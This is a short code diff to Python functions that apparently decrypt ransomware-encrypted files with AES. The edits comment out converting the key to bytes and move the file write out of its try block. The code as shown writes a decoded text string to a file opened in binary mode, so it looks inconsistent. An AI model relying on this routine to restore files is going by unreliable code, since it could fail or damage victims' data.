@@ -232,8 +232,8 @@ def decrypt_ransom_aes(ciphertext, key, padding=chr(0)):
 
     """
     try:
-        if isinstance(key, str):
-            key = key.encode("utf-8")
+        # if isinstance(key, str):
+        #     key = key.encode("utf-8")
 
         # Decode the Base64-encoded ciphertext
         # try:
@@ -256,7 +256,7 @@ def decrypt_ransom_aes(ciphertext, key, padding=chr(0)):
     except Exception as e:
         log("{} error: {}".format(decrypt_ransom_aes.__name__, str(e)))
         raise
-    
+
 
     return plaintext.decode("utf-8", errors="ignore")
 
@@ -334,12 +334,12 @@ def decrypt_file(filename, key):
 
             try:
                 plaintext = decrypt_ransom_aes(ciphertext, key)
-
-                with open(filename, 'wb') as fd:
-                    fd.write(plaintext)
             except Exception as e:
                 log(f'error decoding ransom aes {e}')
                 return f'error decoding ransom aes {e}'
+
+            with open(filename, 'wb') as fd:
+                fd.write(plaintext)
 
             log('{} decrypted'.format(filename))
             return '{} decrypted'.format(filename)
